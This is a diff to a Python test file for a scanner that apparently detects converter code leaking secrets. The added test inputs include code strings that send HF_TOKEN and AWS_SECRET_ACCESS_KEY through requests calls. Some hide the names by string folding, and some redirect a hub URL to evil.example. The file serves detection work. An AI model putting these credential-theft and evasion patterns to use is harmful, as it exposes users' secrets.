@@ -3450,6 +3450,11 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'read_secret = os.getenv\n'
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
         + ' "b": read_secret("AWS_SECRET_ACCESS_KEY")})\n',
+        # And a folded one is the same name spelled to miss a Constant check.
+        'import os\nimport requests\n' + hub
+        + 'other = vars(os)["en" + "viron"]["AWS_SECRET_ACCESS_KEY"]\n'
+        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": other})\n',
         # A module dictionary leaves the name as a string and nothing else,
         # exactly as it did for the write methods.
         'import os\nimport requests\n' + hub
@@ -3465,6 +3470,10 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         'import os\nimport os as o\nimport requests\n' + hub
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
         + ' "b": o.getenv("AWS_SECRET_ACCESS_KEY")})\n',
+        'import os\nimport requests\n' + hub
+        + 'requests.get(HUB)\n'
+        + 'f = vars(requests)["po" + "st"]\n'
+        + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
         # A module dictionary leaves the method name as a string and nothing
         # else. None of these names appears as a string constant anywhere in
         # the 21 real modules either.
@@ -3595,6 +3604,20 @@ def test_an_oversized_join_is_not_folded():
         'requests.get(HUB, headers = {"a": token})\n'
     )
     assert time.perf_counter() - started < 5
+
+    # The ceiling is on the aggregate too: one expansion is bounded, and an
+    # 8 MiB file holds thousands of them, so the literals are iterated under a
+    # shared budget rather than materialised into a list.
+    one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
+    started = time.perf_counter()
+    assert [
+        f.check for f in module.scan_converter_source(
+            preamble
+            + "".join(f"x{i} = {one}" for i in range(200))
+            + 'requests.get(HUB, headers = {"a": token})\n'
+        )
+    ]
+    assert time.perf_counter() - started < 10
 
     # A join small enough to fold is still folded.
     assert [
@@ -4021,6 +4044,18 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # += mutates the carrier in place and the walk still sees only the hub it
     # started as, while at runtime the authority resolves to evil.example.
     assert _reshaped('url = BASE\nurl += "@evil.example/collect"\n')
+    # Appending to a carrier can rewrite the authority without touching the
+    # literal: BASE + "@evil.example/collect" is fetched from evil.example,
+    # everything before the @ being user information. Appending a PATH is what
+    # upstream does, so text that begins with a URL delimiter is fine and
+    # anything else, text this cannot read included, is not.
+    assert _reshaped('url = BASE + "@evil.example/collect"\n')
+    assert _reshaped('url = f"{BASE}@evil.example/collect"\n')
+    assert _reshaped('url = BASE + ".evil.example/collect"\n')
+    assert _reshaped('url = BASE + suffix\n')
+    assert _reshaped('url = BASE + "/api/models"\n') == []
+    assert _reshaped('url = BASE + "?full=true"\n') == []
+    assert _reshaped('url = f"{BASE}/api/{name}"\n') == []
     # A carrier can be bound by unpacking or onto an attribute, and reading only
     # bare Name targets lost it.
     assert _reshaped(
